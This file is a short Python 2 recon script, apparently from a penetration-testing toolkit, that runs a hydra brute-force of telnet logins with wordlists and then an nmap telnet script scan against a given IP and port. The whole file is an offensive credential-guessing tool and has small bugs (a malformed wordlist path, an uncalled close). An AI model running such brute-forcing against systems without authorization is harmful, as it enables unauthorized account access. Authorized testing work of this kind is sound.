#!/usr/bin/env python
import subprocess
import sys

if len(sys.argv) != 3:
    print "Usage: telnetrecon.py <ip address> <port>"
    sys.exit(0)

ip_address = sys.argv[1].strip()
port = sys.argv[2].strip()

print "INFO: Performing hydra telnet scan against " + ip_address
HYDRA = "hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/rockyou,txt -f -o /root/scripts/recon_enum/results/%s_telnethydra.txt -u %s -s %s telnet" % (ip_address, ip_address, port)
try:
    results = subprocess.check_output(HYDRA, shell=True)
    resultarr = results.split("\n")
    for result in resultarr:
        if "login:" in result:
            print "[*] Valid Telnet credentials found: " + result
except:
    print "INFO: No valid Telnet credentials found"

print "INFO: Performing nmap Telnet script scan for " + ip_address + ":" + port
TELNETSCAN = "nmap -sV -Pn -vv -p %s --script=telnet-* -oN './results/%s_telnet.nmap' %s" % (port, ip_address, ip_address)
results = subprocess.check_output(TELNETSCAN, shell=True)
outfile = "results/" + ip_address + "_telnetrecon.txt"
f = open(outfile, "w")
f.write(results)
f.close